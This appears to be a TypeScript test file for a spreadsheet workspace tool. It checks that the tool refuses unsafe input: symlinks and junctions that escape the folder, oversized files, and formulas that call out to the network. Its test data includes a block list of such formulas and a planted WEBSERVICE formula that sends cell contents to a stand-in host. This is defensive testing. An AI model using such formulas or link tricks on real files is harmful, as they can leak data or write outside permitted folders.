import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import ExcelJS from 'exceljs'
import { checkFormula, workbookInspectResult } from '../shared/sheetOps'
import { WorkspaceError, listSpreadsheets, newFilePath } from '../bridge/workspace'
import { workbookApply, workbookInspect } from '../bridge/sheets/jobs'
import { applyOps, OpError } from '../bridge/sheets/ops'
import { findEngine } from '../bridge/sheets/engine'
import { runProgram } from '../bridge/process'

const assert = (c: any, m: string) => { console.log(c ? 'PASS' : 'FAIL', m); if (!c) process.exitCode = 1 }
const rejects = async (fn: () => Promise<unknown> | unknown) => { try { await fn() } catch (e) { return e as Error } return null }
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'olb-sheets-h-'))
const noSignal = new AbortController().signal
const noEngine = { engine: async () => null }

const root = fs.realpathSync(tmp())
const outside = fs.realpathSync(tmp())

async function book(file: string, fill: (ws: ExcelJS.Worksheet) => void, name = 'Sales') {
  const wb = new ExcelJS.Workbook(); fill(wb.addWorksheet(name)); await wb.xlsx.writeFile(path.join(root, file))
}
await book('Sales.xlsx', (ws) => { ws.addRows([['Region', 'Units'], ['North', 3], ['South', 4]]) })

// ---- A name is reserved, never written through, never shared ----
const names = new Set(Array.from({ length: 20 }, () => newFilePath(root, 'Same.xlsx').rel))
assert(names.size === 20 && [...names].every(n => fs.existsSync(path.join(root, n))), 'twenty jobs asking for one name get twenty different, reserved names')
let linked = true
try { fs.symlinkSync(path.join(outside, 'planted.xlsx'), path.join(root, 'Dangling.xlsx')) } catch { linked = false }
if (linked) {
  const got = newFilePath(root, 'Dangling.xlsx')
  assert(got.rel !== 'Dangling.xlsx' && !fs.existsSync(path.join(outside, 'planted.xlsx')), 'a link that leads nowhere is not treated as a free name, and nothing is written through it')
  fs.symlinkSync(path.join(outside, 'newdir'), path.join(root, 'jump'), 'junction')
  assert((await rejects(() => newFilePath(root, 'jump/deeper/new.xlsx'))) instanceof WorkspaceError && !fs.existsSync(path.join(outside, 'newdir')), 'a link to a place that does not exist yet does not let folders be made outside the chosen folder')
  fs.symlinkSync(outside, path.join(root, 'jump2'), 'junction')
  assert((await rejects(() => newFilePath(root, 'jump2/deeper/new.xlsx'))) instanceof WorkspaceError && !fs.existsSync(path.join(outside, 'deeper')), 'a link to a folder outside does not let folders be made there')
} else console.log('SKIP link checks (this machine does not allow making shortcuts)')

// ---- Formulas already in the file ----
for (const bad of ['WEBSERVICE("http://x.example")', '_xlfn.WEBSERVICE("http://x.example")', 'INDIRECT(CHAR(39)&"fi"&"le")', 'COM.MICROSOFT.WEBSERVICE("a")', 'SQL.REQUEST("a")']) assert(checkFormula(bad) !== null, `refused: ${bad}`)
await book('Risky.xlsx', (ws) => { ws.getCell('A1').value = 1; ws.getCell('B1').value = { formula: 'WEBSERVICE("http://x.example/?a="&A1)' } as ExcelJS.CellFormulaValue })
const before = fs.readdirSync(root).sort().join()
const risky = await rejects(() => workbookApply(root, { file: 'Risky.xlsx', ops: [{ op: 'add_sheet', name: 'More' }] }, noSignal, noEngine))
assert(!!risky && /reach outside/.test(risky.message) && fs.readdirSync(root).sort().join() === before, 'a file that already has a web formula is not recalculated, and nothing is left behind')

// ---- A failed job leaves nothing, including the reserved PDF ----
const engine = await findEngine()
if (engine) {
  const failing = { engine: async () => ({ name: engine.name, run: async () => { throw new Error('the program stopped') } }) as any }
  const b2 = fs.readdirSync(root).sort().join()
  const e = await rejects(() => workbookApply(root, { file: 'Sales.xlsx', pdf: true, ops: [{ op: 'add_sheet', name: 'More' }] }, noSignal, failing))
  assert(!!e && fs.readdirSync(root).sort().join() === b2, 'a job that fails after the PDF name was chosen leaves neither the workbook nor the PDF')

  // Labels and values do not have to sit next to each other.
  await book('Apart.xlsx', (ws) => { ws.addRows([['Label', 'x', 'Value'], ['a', 0, 10], ['b', 0, 20], ['c', 0, 30]]) }, 'Data')
  const r = await workbookApply(root, { file: 'Apart.xlsx', ops: [{ op: 'add_chart', sheet: 'Data', type: 'column', categories: 'A2:A4', values: 'C2:C4', title: 'Apart' }] }, noSignal, {})
  assert(r.charts === 1 && r.checks.every(c => c.ok), `a chart with labels and values in separate columns works (${engine.name})`)

  // A typed-in error is reported.
  await book('Typed.xlsx', (ws) => { ws.getCell('A1').value = { error: '#N/A' } as any; ws.getCell('A2').value = 5 }, 'T')
  const t = await workbookApply(root, { file: 'Typed.xlsx', pdf: true, ops: [{ op: 'add_sheet', name: 'Extra' }] }, noSignal, {})
  assert(t.errors.length > 0 && t.checks.some(c => !c.ok), 'an error typed into a cell is reported')
  assert(t.pdf !== null && fs.existsSync(path.join(root, t.pdf)) && fs.statSync(path.join(root, t.pdf)).size > 0, 'the PDF that was asked for exists and is not empty')
} else console.log('SKIP engine checks (no spreadsheet program on this machine)')

// ---- Summaries ----
const sheetWith = (rows: unknown[][]) => { const wb = new ExcelJS.Workbook(); wb.addWorksheet('S').addRows(rows); return wb }
const sum = (rows: unknown[][]) => applyOps(sheetWith(rows), [{ op: 'summarize', source: 'S', groupBy: 'A', value: 'B', fn: 'sum', headerRow: 1, target: 'T' } as any])
assert((await rejects(() => sum([['k', 'v'], ['1', 1], ['01', 2]]))) instanceof OpError, 'groups "1" and "01" are not silently counted together')
{ const wb = sheetWith([['k', 'v'], ['north', 1], ['North', 2], ['south', 3]]); applyOps(wb, [{ op: 'summarize', source: 'S', groupBy: 'A', value: 'B', fn: 'sum', headerRow: 1, target: 'T' } as any]); assert(wb.getWorksheet('T')!.rowCount === 4, 'groups that differ only in capitals are one group (two groups and the total row)') }

// ---- Size and listing ----
fs.writeFileSync(path.join(root, 'Huge.xlsx'), Buffer.alloc(16 * 1024 * 1024))
const huge = await rejects(() => workbookApply(root, { file: 'Huge.xlsx', ops: [{ op: 'add_sheet', name: 'More' }] }, noSignal, noEngine))
assert(!!huge && /larger than/.test(huge.message), 'a file over the size limit is refused before it is unpacked')
const deep = path.join(root, 'a'.repeat(60), 'b'.repeat(60), 'c'.repeat(60)); fs.mkdirSync(deep, { recursive: true }); fs.writeFileSync(path.join(deep, 'x'.repeat(40) + '.csv'), 'a,b\n1,2\n')
assert(listSpreadsheets(root).files.every(f => f.name.length <= 200), 'a very long path is left out of the listing instead of breaking it')

// ---- A big workbook still comes back ----
const wide = new ExcelJS.Workbook()
for (let i = 1; i <= 12; i++) { const ws = wide.addWorksheet(`Sheet number ${i} with a long name`); for (let r = 1; r <= 7; r++) ws.addRow(Array.from({ length: 20 }, (_, c) => 'long cell text '.repeat(4) + r + c)) }
await wide.xlsx.writeFile(path.join(root, 'Wide.xlsx'))
const wideOut = await workbookInspect(root, { file: 'Wide.xlsx' })
assert(JSON.stringify(wideOut).length <= 14_000 && workbookInspectResult.safeParse(wideOut).success, 'a workbook with many sheets is made smaller to fit, not rejected')

// ---- A stopped program stops everything it started ----
if (process.platform !== 'win32') {
  const marker = path.join(root, 'child.pid')
  const started = Date.now()
  const r = await runProgram('sh', ['-c', `sleep 30 & echo $! > "${marker}"; wait`], { timeoutMs: 600 })
  await new Promise(res => setTimeout(res, 300))
  const pid = Number(fs.readFileSync(marker, 'utf8').trim())
  let alive = true
  try { process.kill(pid, 0) } catch { alive = false }
  // A stopped program that has not been collected yet still shows up; it is not running.
  try { if (/^State:\s+Z/m.test(fs.readFileSync(`/proc/${pid}/status`, 'utf8'))) alive = false } catch { /* not on Linux, or gone */ }
  assert(r.timedOut && Date.now() - started < 5000 && !alive, 'a program that runs too long is stopped together with what it started')
  const ac = new AbortController()
  const p = runProgram('sleep', ['30'], { timeoutMs: 20_000, signal: ac.signal })
  setTimeout(() => ac.abort(), 200)
  const t0 = Date.now(); await p
  assert(Date.now() - t0 < 3000, 'a cancelled program stops straight away')
}

fs.rmSync(root, { recursive: true, force: true }); fs.rmSync(outside, { recursive: true, force: true })
